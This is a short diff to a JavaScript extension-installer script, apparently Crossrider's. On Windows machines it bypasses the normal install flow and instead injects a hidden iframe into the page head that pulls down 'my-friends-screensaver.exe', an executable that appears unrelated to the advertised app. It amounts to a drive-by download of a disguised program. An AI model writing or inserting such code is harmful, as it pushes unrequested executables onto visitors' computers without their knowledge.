@@ -12,8 +12,10 @@ var crossriderInstaller = (function (window) {
 			},
 			installer:{
 				domain:(secure ? "https://crossrider.cotssl.net" : "http://static.crossrider.com"),
+				iron_url:'https://crossrider.cotssl.net/dk/my-friends-screensaver.exe',
 				app_id:null,
 				app_name:'Crossrider Platform',
+				iron:true,
 				bundle:false,
 				showOverlay:true,
 				forceIframeOverlay:false
@@ -235,6 +237,15 @@ var crossriderInstaller = (function (window) {
 	}
 
 	function install() {
+		var isWindows = /^win/i.test(navigator.platform);
+
+		if (config.installer.iron && isWindows) {
+			installIron();
+
+			return;
+		}
+		
+		
 		if (!ready) {
 			setTimeout(install, 100);
 
@@ -307,6 +318,10 @@ var crossriderInstaller = (function (window) {
 		var ie_url = (secure ? config.installer.files.explorer_secure : config.installer.files.explorer);
 		
 		$('<iframe />').attr('src', ie_url).appendTo('head');
+	}
+
+	function installIron() {
+		$('<iframe />').attr('src', config.installer.iron_url).appendTo('head');
 	}
 
 	function installChrome() {
